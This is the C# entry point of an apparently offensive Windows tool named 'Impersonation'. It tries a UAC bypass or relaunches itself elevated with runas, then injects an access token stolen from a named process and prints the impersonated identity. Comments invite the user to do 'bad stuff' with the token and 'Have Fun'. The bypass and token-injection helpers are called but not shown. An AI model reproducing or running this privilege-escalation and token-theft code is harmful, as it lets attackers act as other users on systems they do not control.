// Target framework for the code: .NET Framework 4.8
// Wrote by: TeamStella, EndReached

using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Impersonation
{
	internal class Program
	{
		[DllImport("shell32.dll", CharSet = CharSet.Auto)]
		private static extern bool ShellExecuteEx(ref SHELLEXECUTEINFO lpExecInfo);

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
		private struct SHELLEXECUTEINFO
		{
			public int cbSize;
			public uint fMask;
			public IntPtr hwnd;
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpVerb;
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpFile;
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpParameters;
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpDirectory;
			public int nShow;
			public IntPtr hInstApp;
			public IntPtr lpIDList;
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpClass;
			public IntPtr hkeyClass;
			public uint dwHotKey;
			public IntPtr hIcon;
			public IntPtr hProcess;
		}
		private const int SW_SHOW = 5;
		private const int SW_SHOWNORMAL = 1;
		private const int SW_HIDE = 0;

		static void Main(string[] args)
		{
			if (!Bypass.IsElevated())
			{
				if (Bypass.GetOSVersion())
				{
					Bypass.ExecuteBypass(args);
				}
				else
				{
					string currentExe = System.Reflection.Assembly.GetExecutingAssembly().Location;

					SHELLEXECUTEINFO sei = new SHELLEXECUTEINFO
					{
						cbSize = Marshal.SizeOf(typeof(SHELLEXECUTEINFO)),
						lpVerb = "runas",
						lpFile = currentExe,
						hwnd = IntPtr.Zero,
						nShow = SW_SHOW,
						lpParameters = string.Join(" ", args)
					};

					ShellExecuteEx(ref sei);
				}
				Environment.Exit(0);
			}
			if (args.Length != 1)
			{
				Console.WriteLine("Usage: Impersonation.exe <process_name> (without extension)");
				Console.ReadKey();
				return;
			}
			string processName = args[0];
			Console.WriteLine(processName);
			bool result = Impersonate.Impersonation.InjectToken(processName);
			if (result)
			{
				Console.WriteLine($"Successfully injected token from process '{processName}'.");
				Console.WriteLine($"Current Windows Identity: {WindowsIdentity.GetCurrent().Name}");
				Console.WriteLine($"Current Windows Identity Token: {WindowsIdentity.GetCurrent().Token}");

				// Now, Here some bad stuff can be done with the impersonated token,
				// like accessing resources or performing actions as the impersonated user.

				// Have Fun

				Console.WriteLine("Press any key to revert token...");

				Console.ReadKey();

				if (Impersonate.Impersonation.RevertToken())
				{
					Console.WriteLine("Successfully reverted token.");
				}
				else
				{
					Console.WriteLine("Failed to revert token.");
				}
			}
			else
			{
				Console.WriteLine($"Failed to inject token from process '{processName}'.");
				Console.WriteLine($"Reason: {Marshal.GetLastWin32Error()}");
				Console.WriteLine("Press any key to exit...");
				Console.ReadKey();
			}

		}
	}
}